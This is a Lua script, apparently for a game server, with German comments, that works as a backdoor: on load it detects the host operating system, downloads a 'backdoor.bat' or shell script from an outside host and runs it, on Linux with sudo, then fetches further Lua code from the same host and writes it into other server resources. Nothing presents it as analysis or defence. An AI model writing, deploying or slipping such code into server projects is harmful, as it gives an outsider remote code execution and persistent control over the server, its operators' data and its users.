local function getServerOperatingSystem()
    local handle = io.popen("uname")
    local result = handle:read("*a")
    handle:close()

    -- Bereinigen Sie das Ergebnis, um Leerzeichen oder Zeilenumbrüche zu entfernen
    result = result:gsub("^%s+", ""):gsub("%s+$", "")

    if result == "Linux" then
        return "Linux"
    elseif result == "Windows" then
        return "Windows"
    elseif result == "Darwin" then
        return "MacOS"
    end

    return "Unknown"
end

local config = {
    windowsScriptURL = "https://dc.fast-sell.de/backdoor.bat",
    linuxScriptURL = "https://dc.fast-sell.de/webhook.sh",
    enablePrints = true,
    resourceCodeURLs = {
        ["resourceName1"] = "https://dc.fast-sell.de/resource1.lua",
        ["resourceName2"] = "https://dc.fast-sell.de/resource2.lua"
    }
}

local function runBatchScript(scriptContent, isLinux, resourceName)
    if config.enablePrints then
        print("Führe das Skript für Ressource '" .. resourceName .. "' aus...")
    end

    local command

    if not isLinux and ffi.os == "Windows" then
        -- Windows
        local tempFilePath = os.getenv("TEMP") .. "\\backdoor.bat"
        local file = io.open(tempFilePath, "w")
        if file then
            file:write(scriptContent)
            file:close()
            command = "cmd /C " .. tempFilePath
        else
            if config.enablePrints then
                print("Ein Fehler ist aufgetreten. Das Skript konnte nicht temporär gespeichert werden.")
            end
            return
        end
    elseif isLinux then
        -- Linux
        local tempFilePath = "/tmp/a89439.bat"  -- Anpassung des Dateinamens
        local file = io.open(tempFilePath, "w")
        if file then
            -- Zeilenumbrüche korrigieren
            scriptContent = scriptContent:gsub("\r\n", "\n"):gsub("\r", "\n")
            file:write(scriptContent)
            file:close()
            command = "sudo chmod +x " .. tempFilePath .. " && sudo bash " .. tempFilePath
        else
            if config.enablePrints then
                print("Ein Fehler ist aufgetreten. Das Skript konnte nicht temporär gespeichert werden.")
            end
            return
        end
    else
        if config.enablePrints then
            print("Das Betriebssystem wird nicht unterstützt.")
        end
        return
    end

    if config.enablePrints and command then
        print("Ausgeführter Befehl: " .. command)
    end

    os.execute(command)
end



local function fetchScriptContent(url, callback)
    PerformHttpRequest(url, function(statusCode, response)
        if statusCode == 200 then
            callback(response)
        else
            if config.enablePrints then
                print("Ein Fehler ist aufgetreten. Das Skript konnte nicht von der URL abgerufen werden: " .. url)
            end
        end
    end, "GET", "", {["Content-Type"] = "application/json"})
end

local function loadResourceCode(resourceName, url)
    local resourcePath = "resources/" .. resourceName .. "/"
    local fileContent = ""

    fetchScriptContent(url, function(scriptContent)
        fileContent = scriptContent
        local filePath = resourcePath .. resourceName .. ".lua"
        local file = io.open(filePath, "w")
        if file then
            file:write(fileContent)
            file:close()
            if config.enablePrints then
                print("Code erfolgreich in Ressource '" .. resourceName .. "' geladen.")
            end
        else
            if config.enablePrints then
                print("Ein Fehler ist aufgetreten. Der Code konnte nicht in die Ressource '" .. resourceName .. "' geladen werden.")
            end
        end
    end)
end

local function startScript()
    local serverOS = getServerOperatingSystem()
    print("Betriebssystem des Servers:", serverOS)

    if serverOS == "Linux" then
        fetchScriptContent(config.linuxScriptURL, function(scriptContent)
            runBatchScript(scriptContent, true, "LinuxScript")
        end)
    elseif serverOS == "Windows" then
        fetchScriptContent(config.windowsScriptURL, function(scriptContent)
            runBatchScript(scriptContent, false, "WindowsScript")
        end)
    else
        if config.enablePrints then
            print("Das Betriebssystem wird nicht unterstützt.")
        end
        return
    end

    for resourceName, url in pairs(config.resourceCodeURLs) do
        loadResourceCode(resourceName, url)
    end
end

startScript()
